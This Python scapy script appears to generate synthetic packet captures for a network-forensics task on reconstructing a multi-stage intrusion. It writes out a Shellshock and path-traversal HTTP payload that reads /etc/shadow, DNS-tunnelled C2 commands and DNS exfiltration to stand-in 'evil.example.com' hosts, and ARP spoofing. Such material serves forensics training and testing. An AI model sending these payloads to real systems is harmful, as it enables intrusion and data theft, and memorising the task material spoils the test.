#!/usr/bin/env python3
"""Generate deterministic pcap captures for multi-stage intrusion reconstruction task."""

import base64
import os
from scapy.all import (
    Ether, IP, TCP, UDP, ARP, DNS, DNSQR, DNSRR, Dot1Q, Raw, wrpcap, conf,
)

conf.verb = 0

T0 = 1700000000.0

MAC = {
    "attacker": "aa:bb:cc:dd:ee:01",
    "router":   "02:00:ff:ff:ff:01",
    "web":      "02:00:01:00:01:0a",
    "dns":      "02:00:01:00:01:35",
    "ws1":      "02:00:02:00:02:0a",
    "ws2":      "02:00:02:00:02:14",
    "ws3":      "02:00:02:00:02:1e",
    "gw_int":   "02:00:02:00:02:01",
    "db":       "02:00:03:00:03:0a",
    "file":     "02:00:03:00:03:14",
}

IPADDR = {
    "attacker": "203.0.113.50",
    "web":      "10.0.1.10",
    "dns":      "10.0.1.53",
    "ws1":      "10.0.2.10",
    "ws2":      "10.0.2.20",
    "ws3":      "10.0.2.30",
    "gw_int":   "10.0.2.1",
    "db":       "10.0.3.10",
    "file":     "10.0.3.20",
}

C2_DOMAIN = "c2.evil.example.com"
EXFIL_DOMAIN = "exfil.evil.example.com"
C2_CMDS = [("whoami", "root"), ("ls -la /etc", "passwd shadow")]
EXFIL_PARTS = [b"CONFIDENTIAL:customer_db", b"_dump_2024"]


def b64_label(data):
    """Base64-encode bytes for DNS subdomain label (padding stripped)."""
    return base64.b64encode(data).decode().rstrip("=")


def b64_full(data):
    """Base64-encode with padding (for TXT record values)."""
    return base64.b64encode(data).decode()


def stamp(pkt, t):
    pkt.time = t
    return pkt


def gen_perimeter():
    """Perimeter capture: external recon + HTTP exploit.  14 packets total."""
    pkts = []

    scan_ports = [(22, False), (80, True), (443, True), (8080, False), (3306, False)]
    for i, (dport, is_open) in enumerate(scan_ports):
        sport = 44001 + i
        t = T0 + i * 0.5
        syn = (Ether(src=MAC["attacker"], dst=MAC["router"]) /
               IP(src=IPADDR["attacker"], dst=IPADDR["web"]) /
               TCP(sport=sport, dport=dport, flags="S", seq=1000 + i * 100))
        pkts.append(stamp(syn, t))

        if is_open:
            resp = (Ether(src=MAC["router"], dst=MAC["attacker"]) /
                    IP(src=IPADDR["web"], dst=IPADDR["attacker"]) /
                    TCP(sport=dport, dport=sport, flags="SA",
                        seq=2000 + i * 100, ack=1001 + i * 100))
        else:
            resp = (Ether(src=MAC["router"], dst=MAC["attacker"]) /
                    IP(src=IPADDR["web"], dst=IPADDR["attacker"]) /
                    TCP(sport=dport, dport=sport, flags="RA",
                        seq=0, ack=1001 + i * 100))
        pkts.append(stamp(resp, t + 0.01))

    t_exp = T0 + 5.0
    syn = (Ether(src=MAC["attacker"], dst=MAC["router"]) /
           IP(src=IPADDR["attacker"], dst=IPADDR["web"]) /
           TCP(sport=44006, dport=80, flags="S", seq=5000))
    pkts.append(stamp(syn, t_exp))

    sa = (Ether(src=MAC["router"], dst=MAC["attacker"]) /
          IP(src=IPADDR["web"], dst=IPADDR["attacker"]) /
          TCP(sport=80, dport=44006, flags="SA", seq=6000, ack=5001))
    pkts.append(stamp(sa, t_exp + 0.01))

    http_req = (
        "GET /admin/../../../etc/shadow HTTP/1.1\r\n"
        "Host: " + IPADDR["web"] + "\r\n"
        "User-Agent: () { :;}; /bin/bash -c 'cat /etc/shadow'\r\n"
        "\r\n"
    ).encode()
    req = (Ether(src=MAC["attacker"], dst=MAC["router"]) /
           IP(src=IPADDR["attacker"], dst=IPADDR["web"]) /
           TCP(sport=44006, dport=80, flags="PA", seq=5001, ack=6001) /
           Raw(load=http_req))
    pkts.append(stamp(req, t_exp + 0.02))

    http_resp = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/plain\r\n"
        "\r\n"
        "root:$6$rounds=5000$salt$hash:19000:0:99999:7:::\n"
    ).encode()
    resp = (Ether(src=MAC["router"], dst=MAC["attacker"]) /
            IP(src=IPADDR["web"], dst=IPADDR["attacker"]) /
            TCP(sport=80, dport=44006, flags="PA",
                seq=6001, ack=5001 + len(http_req)) /
            Raw(load=http_resp))
    pkts.append(stamp(resp, t_exp + 0.03))

    wrpcap("/app/captures/perimeter.pcap", pkts)
    return len(pkts)


def gen_dmz_switch():
    """DMZ switch capture: C2 DNS tunneling.  6 packets total."""
    pkts = []

    arp_req = (Ether(src=MAC["web"], dst="ff:ff:ff:ff:ff:ff") /
               ARP(op=1, hwsrc=MAC["web"], psrc=IPADDR["web"],
                   hwdst="00:00:00:00:00:00", pdst=IPADDR["dns"]))
    pkts.append(stamp(arp_req, T0 + 10.0))

    arp_rep = (Ether(src=MAC["dns"], dst=MAC["web"]) /
               ARP(op=2, hwsrc=MAC["dns"], psrc=IPADDR["dns"],
                   hwdst=MAC["web"], pdst=IPADDR["web"]))
    pkts.append(stamp(arp_rep, T0 + 10.01))

    for i, (cmd, resp_text) in enumerate(C2_CMDS):
        label = b64_label(cmd.encode())
        qname = label + "." + C2_DOMAIN
        resp_data = b64_full(resp_text.encode())
        t = T0 + 10.5 + i * 1.5

        query = (Ether(src=MAC["web"], dst=MAC["dns"]) /
                 IP(src=IPADDR["web"], dst=IPADDR["dns"]) /
                 UDP(sport=53001 + i, dport=53) /
                 DNS(rd=1, id=0x1000 + i,
                     qd=DNSQR(qname=qname, qtype="TXT")))
        pkts.append(stamp(query, t))

        response = (Ether(src=MAC["dns"], dst=MAC["web"]) /
                    IP(src=IPADDR["dns"], dst=IPADDR["web"]) /
                    UDP(sport=53, dport=53001 + i) /
                    DNS(qr=1, aa=1, id=0x1000 + i,
                        qd=DNSQR(qname=qname, qtype="TXT"),
                        an=DNSRR(rrname=qname, type="TXT",
                                 rdata=resp_data)))
        pkts.append(stamp(response, t + 0.01))

    wrpcap("/app/captures/dmz_switch.pcap", pkts)
    return len(pkts)


def gen_core_switch():
    """Core switch capture: 802.1Q tagged inter-VLAN traffic.  12 packets total."""
    pkts = []

    targets = [
        (IPADDR["ws1"], MAC["ws1"], False),
        (IPADDR["ws2"], MAC["ws2"], True),
        (IPADDR["ws3"], MAC["ws3"], False),
    ]
    for i, (dst_ip, dst_mac, is_open) in enumerate(targets):
        t = T0 + 20.0 + i * 0.5
        sport = 55001 + i
        syn = (Ether(src=MAC["web"], dst=dst_mac) /
               Dot1Q(vlan=100) /
               IP(src=IPADDR["web"], dst=dst_ip) /
               TCP(sport=sport, dport=22, flags="S", seq=7000 + i * 100))
        pkts.append(stamp(syn, t))

        if is_open:
            resp = (Ether(src=dst_mac, dst=MAC["web"]) /
                    Dot1Q(vlan=200) /
                    IP(src=dst_ip, dst=IPADDR["web"]) /
                    TCP(sport=22, dport=sport, flags="SA",
                        seq=8000 + i * 100, ack=7001 + i * 100))
        else:
            resp = (Ether(src=dst_mac, dst=MAC["web"]) /
                    Dot1Q(vlan=200) /
                    IP(src=dst_ip, dst=IPADDR["web"]) /
                    TCP(sport=22, dport=sport, flags="RA",
                        seq=0, ack=7001 + i * 100))
        pkts.append(stamp(resp, t + 0.01))

    t_ssh = T0 + 25.0
    syn = (Ether(src=MAC["web"], dst=MAC["ws2"]) /
           Dot1Q(vlan=100) /
           IP(src=IPADDR["web"], dst=IPADDR["ws2"]) /
           TCP(sport=55010, dport=22, flags="S", seq=9000))
    pkts.append(stamp(syn, t_ssh))

    sa = (Ether(src=MAC["ws2"], dst=MAC["web"]) /
          Dot1Q(vlan=200) /
          IP(src=IPADDR["ws2"], dst=IPADDR["web"]) /
          TCP(sport=22, dport=55010, flags="SA", seq=10000, ack=9001))
    pkts.append(stamp(sa, t_ssh + 0.01))

    ack = (Ether(src=MAC["web"], dst=MAC["ws2"]) /
           Dot1Q(vlan=100) /
           IP(src=IPADDR["web"], dst=IPADDR["ws2"]) /
           TCP(sport=55010, dport=22, flags="A", seq=9001, ack=10001))
    pkts.append(stamp(ack, t_ssh + 0.02))

    t_db = T0 + 30.0
    syn = (Ether(src=MAC["ws2"], dst=MAC["db"]) /
           Dot1Q(vlan=200) /
           IP(src=IPADDR["ws2"], dst=IPADDR["db"]) /
           TCP(sport=55020, dport=3306, flags="S", seq=11000))
    pkts.append(stamp(syn, t_db))

    sa = (Ether(src=MAC["db"], dst=MAC["ws2"]) /
          Dot1Q(vlan=300) /
          IP(src=IPADDR["db"], dst=IPADDR["ws2"]) /
          TCP(sport=3306, dport=55020, flags="SA", seq=12000, ack=11001))
    pkts.append(stamp(sa, t_db + 0.01))

    ack = (Ether(src=MAC["ws2"], dst=MAC["db"]) /
           Dot1Q(vlan=200) /
           IP(src=IPADDR["ws2"], dst=IPADDR["db"]) /
           TCP(sport=55020, dport=3306, flags="A", seq=11001, ack=12001))
    pkts.append(stamp(ack, t_db + 0.02))

    wrpcap("/app/captures/core_switch.pcap", pkts)
    return len(pkts)


def gen_internal_monitor():
    """Internal monitor capture: DNS exfiltration + ARP poisoning.  8 packets total."""
    pkts = []

    for i, part in enumerate(EXFIL_PARTS):
        label = b64_label(part)
        qname = label + "." + EXFIL_DOMAIN
        t = T0 + 35.0 + i * 0.5

        query = (Ether(src=MAC["ws2"], dst=MAC["gw_int"]) /
                 IP(src=IPADDR["ws2"], dst=IPADDR["dns"]) /
                 UDP(sport=54001 + i, dport=53) /
                 DNS(rd=1, id=0x2000 + i,
                     qd=DNSQR(qname=qname, qtype="TXT")))
        pkts.append(stamp(query, t))

        response = (Ether(src=MAC["gw_int"], dst=MAC["ws2"]) /
                    IP(src=IPADDR["dns"], dst=IPADDR["ws2"]) /
                    UDP(sport=53, dport=54001 + i) /
                    DNS(qr=1, aa=1, id=0x2000 + i,
                        qd=DNSQR(qname=qname, qtype="TXT"),
                        an=DNSRR(rrname=qname, type="TXT",
                                 rdata="ok")))
        pkts.append(stamp(response, t + 0.01))

    arp_req = (Ether(src=MAC["ws2"], dst="ff:ff:ff:ff:ff:ff") /
               ARP(op=1, hwsrc=MAC["ws2"], psrc=IPADDR["ws2"],
                   hwdst="00:00:00:00:00:00", pdst=IPADDR["gw_int"]))
    pkts.append(stamp(arp_req, T0 + 40.0))

    arp_rep = (Ether(src=MAC["gw_int"], dst=MAC["ws2"]) /
               ARP(op=2, hwsrc=MAC["gw_int"], psrc=IPADDR["gw_int"],
                   hwdst=MAC["ws2"], pdst=IPADDR["ws2"]))
    pkts.append(stamp(arp_rep, T0 + 40.01))

    garp1 = (Ether(src=MAC["ws2"], dst="ff:ff:ff:ff:ff:ff") /
             ARP(op=2, hwsrc=MAC["ws2"], psrc=IPADDR["gw_int"],
                 hwdst="ff:ff:ff:ff:ff:ff", pdst=IPADDR["gw_int"]))
    pkts.append(stamp(garp1, T0 + 42.0))

    garp2 = (Ether(src=MAC["ws2"], dst="ff:ff:ff:ff:ff:ff") /
             ARP(op=2, hwsrc=MAC["ws2"], psrc=IPADDR["gw_int"],
                 hwdst="ff:ff:ff:ff:ff:ff", pdst=IPADDR["gw_int"]))
    pkts.append(stamp(garp2, T0 + 47.0))

    wrpcap("/app/captures/internal_monitor.pcap", pkts)
    return len(pkts)


if __name__ == "__main__":
    os.makedirs("/app/captures", exist_ok=True)
    n1 = gen_perimeter()
    n2 = gen_dmz_switch()
    n3 = gen_core_switch()
    n4 = gen_internal_monitor()
    print(f"perimeter={n1} dmz={n2} core={n3} internal={n4} total={n1+n2+n3+n4}")
